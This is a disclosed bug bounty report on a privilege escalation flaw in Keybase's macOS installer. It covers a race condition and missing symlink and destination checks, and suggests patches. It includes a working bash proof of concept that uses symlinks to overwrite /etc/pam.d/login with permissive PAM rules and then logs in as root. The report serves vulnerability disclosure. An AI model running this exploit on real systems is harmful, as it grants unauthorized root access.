@@ -1,0 +1,103 @@
+ReportLink:https://hackerone.com/reports/473252
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/jinmo123
+ReportedTo:Keybase(keybase)
+BountyAmount:2500.0
+Severity:high
+State:Closed
+DateOfDisclosure:30.01.2019 18:59:22
+
+Summary:
+
+Keybase.app is bundled with the components installer named KeybaseInstaller.app. When `--install-app-bundle --source-path <src> --app-path <dst>` is given to installer, KBAppBundle.m checks if `<src>`  is properly codesigned, then copies it to `<dst>`.
+
+First, there's two vulnerabilities in the source path validation: the check is racy, there's no symlink check.
+
+## 1. Race condition
+
+Since now the privileged helper (user=root) only accepts XPC request from 'admin' group, The path `/Application/Keybase.app` is often writable. So I think that race condition is possible between (1) and (2).
+
+```objc
+(1)   [self validate:sourcePath completion:^(NSError *error) {
+        if (error) {
+          completion(error);
+          return;
+        }
+
+        DDLogInfo(@"Copying app bundle %@ to %@", sourcePath, destinationPath);
+        NSDictionary *params = @{@"source": sourcePath, @"destination": destinationPath};
+(2)     [self.helperTool.helper sendRequest:@"move" params:@[params] completion:^(NSError *error, id value) {
+```
+
+Successful exploitation will bypass the source check. I skipped writing PoC code since the race window is bit narrow.
+
+## 2. No symbolic link check
+
+If source path is symbolic link to /Application/Keybase.app, the check is bypassed. Attacker can make a symbolic link like this:
+
+/tmp/A -> /tmp/B -> /Application/Keybase.app
+
+Because the helper uses `NSFileManager::moveItemAtPath`, the symbolic link itself is copied. Copying /tmp/A causes destination path to be a symbolic link to /tmp/B, and further it can be modified to our file.
+
+## 3. Missing check for destination
+
+Second, there's no check for the destination path, which is passed from `--app-path` parameter. This makes the admin to overwrite any file or folder like `/etc`.
+
+Combining 2, 3, user can overwrite any files to point the writable path.
+
+```bash
+#!/bin/bash
+
+export APP=/Applications/Keybase.app
+export INSTALLER=$APP/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase
+
+export A=/tmp/_$RANDOM
+export B=/tmp/_$RANDOM
+
+# This script does `ln -sf /tmp/$R $DEST` in root permission
+export DEST=/etc/pam.d/login
+
+rm -rf $A $B
+ln -s $APP $B
+ln -s $B $A
+
+$INSTALLER --run-mode=prod --app-path=$DEST --timeout=8 --install-app-bundle --source-path=$A --debug
+
+# Now $DEST -> /tmp/$B (symlink)
+# replace /tmp/$B to own contents
+rm -rf /tmp/$B
+
+cat > /tmp/$B <<EOF
+# login: auth account password session
+auth       optional       pam_permit.so
+auth       optional       pam_permit.so
+auth       optional       pam_permit.so
+auth       required       pam_permit.so
+account    required       pam_permit.so
+account    required       pam_permit.so
+password   required       pam_permit.so
+session    required       pam_permit.so
+session    required       pam_permit.so
+session    optional       pam_permit.so
+
+EOF
+
+# Now there's no pam-based check for /usr/bin/login
+echo id | login root
+```
+
+
+
+## Patch
+
+### Source path check
+
+Maybe the app bundle can be compressed with proper signature, and checked in the way of the redirector check on [KBHelper.m line 260](https://github.com/keybase/client/blob/363e5462a0805db3fb5b5e31f9f5bc2d4d01964f/osx/Helper/KBHelper.m#L260), and extracted in the helper.
+
+### Destination path check
+
+I'm not sure how this can have additional restrictions, but maybe user alerts like those in `--install-helper` would be good. Alternatively, checking if `app_path == "/Applications/Keybase.app"` will work, too.
+
+## Impact
+
+The privilege can be escalated to 'root' from any user in 'admin' group (including the default user) and have access to keybase.Helper XPC service.
